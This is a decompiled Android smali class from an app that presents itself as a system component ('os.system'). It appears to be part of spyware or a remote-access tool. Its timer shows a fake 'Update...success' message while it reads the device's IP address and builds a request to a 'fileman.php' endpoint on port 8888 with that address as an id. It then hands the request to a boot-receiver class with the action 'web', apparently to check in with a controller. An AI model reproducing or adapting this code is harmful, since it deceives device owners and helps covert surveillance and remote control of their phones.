.class Los/system/MainActivity$1;
.super Landroid/os/CountDownTimer;
.source "MainActivity.java"


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Los/system/MainActivity;->onDestroy()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic this$0:Los/system/MainActivity;


# direct methods
.method constructor <init>(Los/system/MainActivity;JJ)V
    .locals 0

    .prologue
    .line 102
    iput-object p1, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    invoke-direct {p0, p2, p3, p4, p5}, Landroid/os/CountDownTimer;-><init>(JJ)V

    return-void
.end method


# virtual methods
.method public onFinish()V
    .locals 3

    .prologue
    .line 125
    iget-object v0, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    const-string v1, "Update...success"

    const/4 v2, 0x1

    invoke-static {v0, v1, v2}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v0

    invoke-virtual {v0}, Landroid/widget/Toast;->show()V

    .line 126
    return-void
.end method

.method public onTick(J)V
    .locals 7

    .prologue
    const/4 v0, 0x0

    .line 104
    iget-object v1, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    invoke-static {v1}, Los/system/MainActivity;->access$000(Los/system/MainActivity;)Z

    move-result v1

    if-eqz v1, :cond_0

    .line 105
    iget-object v1, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    const-string v2, "Update...success"

    invoke-static {v1, v2, v0}, Landroid/widget/Toast;->makeText(Landroid/content/Context;Ljava/lang/CharSequence;I)Landroid/widget/Toast;

    move-result-object v1

    invoke-virtual {v1}, Landroid/widget/Toast;->show()V

    .line 106
    iget-object v1, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    invoke-static {v1, v0}, Los/system/MainActivity;->access$002(Los/system/MainActivity;Z)Z

    .line 108
    :cond_0
    const/4 v1, 0x1

    invoke-static {v1}, Los/system/Identitas;->getIPAddress(Z)Ljava/lang/String;

    move-result-object v1

    .line 109
    const-string v2, "[.]"

    invoke-virtual {v1, v2}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v2

    .line 111
    array-length v3, v2

    add-int/lit8 v3, v3, -0x1

    .line 112
    new-instance v4, Ljava/lang/StringBuffer;

    invoke-direct {v4}, Ljava/lang/StringBuffer;-><init>()V

    .line 114
    :goto_0
    if-ge v0, v3, :cond_1

    .line 115
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    aget-object v6, v2, v0

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    const-string v6, "."

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuffer;->append(Ljava/lang/String;)Ljava/lang/StringBuffer;

    .line 114
    add-int/lit8 v0, v0, 0x1

    goto :goto_0

    .line 118
    :cond_1
    iget-object v0, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    invoke-static {v0}, Los/system/MainActivity;->access$100(Los/system/MainActivity;)Los/system/ReceiverBoot;

    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "http://"

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    move-result-object v0

    const-string v2, "1:8888/fileman.php?id="

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    sput-object v0, Los/system/ReceiverBoot;->requestUrl:Ljava/lang/String;

    .line 119
    iget-object v0, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    invoke-static {v0}, Los/system/MainActivity;->access$100(Los/system/MainActivity;)Los/system/ReceiverBoot;

    const-string v0, "web"

    sput-object v0, Los/system/ReceiverBoot;->requestAksi:Ljava/lang/String;

    .line 120
    iget-object v0, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    invoke-static {v0}, Los/system/MainActivity;->access$100(Los/system/MainActivity;)Los/system/ReceiverBoot;

    move-result-object v0

    iget-object v1, p0, Los/system/MainActivity$1;->this$0:Los/system/MainActivity;

    invoke-virtual {v0, v1}, Los/system/ReceiverBoot;->mainRequest(Landroid/content/Context;)V

    .line 122
    return-void
.end method
